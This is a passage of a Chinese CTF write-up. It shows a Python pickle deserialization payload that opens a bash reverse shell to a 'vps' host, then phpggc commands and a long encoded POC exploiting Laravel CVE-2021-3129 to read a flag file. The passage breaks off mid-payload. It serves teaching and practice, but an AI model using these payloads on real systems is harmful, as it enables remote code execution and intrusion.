    <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">pickled</span><span class="p">)</span>
    <span class="n">deserialized</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="k">return</span> <span class="s1">''</span><span class="p">,</span> <span class="mi">204</span>
</pre></div>
<p>传参后提示json我们传json，打反序列化反弹shell</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">base64</span>
<span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s1">'''cos</span>
<span class="s1">system</span>
<span class="s1">(S"bash -c 'bash -i &gt;&amp; /dev/tcp/vps/2333 0&gt;&amp;1'"</span>
<span class="s1">tR.</span>
<span class="s1">'''</span>
<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">opcode</span><span class="p">))</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109180606-3bf8cdd2-9e82-1.png"/></p>
<h2 data-content="1" id="67b2dedd964034559243f603f446b1a6">larave-lpcb2024</h2>
<p>看到版本搜一下Laravel RCE（CVE-2021-3129)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109180638-4f852e18-9e82-1.png"/></p>
<p>先下载exp</p>
<div class="highlight"><pre><span></span>git clone https<span class="o">://</span>github.com<span class="o">/</span>ambionics<span class="o">/</span>phpggc.git

chmod <span class="m">777</span> <span class="m">.</span><span class="o">/</span>phpggc
</pre></div>
<p>docker运行phpggc生成payload</p>
<div class="highlight"><pre><span></span>docker run phpggc Laravel<span class="o">/</span>RCE5 <span class="s">"system('cat /flag.txt');;"</span> <span class="o">--</span>phar phar <span class="o">-</span>o php<span class="o">://</span>output <span class="o">|</span> base64 <span class="o">-</span>w <span class="m">0</span> <span class="o">|</span> python <span class="o">-</span><span class="kt">c</span> <span class="s">"import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"</span>
</pre></div>
<p>得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：</p>
<div class="highlight"><pre><span></span><span class="o">=</span><span class="m">50</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">77</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">67</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">55</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">78</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">55</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">50</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">54</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">54</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">53</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">43</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">37</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">38</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">2</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">67</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">54</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">53</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">78</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">73</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">70</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">78</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">43</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">33</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">70</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">55</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">75</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">75</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">43</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">70</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">37</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">67</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">75</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">38</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">55</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">73</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">70</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">33</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">42</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">65</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">33</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">54</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">67</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">71</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">55</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">78</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">70</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">37</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">54</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">77</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">38</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">55</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">76</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">54</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">79</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">78</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">65</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">33</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">31</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">70</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">45</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">37</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">73</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">32</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">46</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">39</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">66</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">44</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">43</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">41</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">5</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">69</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span><span class="bp">F</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">30</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">38</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>D<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">7</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">67</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">36</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">49</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>B<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>C<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">73</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">62</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">48</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">74</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">61</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">35</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">68</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">64</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">47</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">56</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">63</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">51</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>E<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">76</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">57</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">52</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">6</span>A<span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">59</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">58</span><span class="o">=</span><span class="m">00</span><span class="o">=</span><span class="m">4</span>E<span class="o">=</span><span class="m">00</span><span 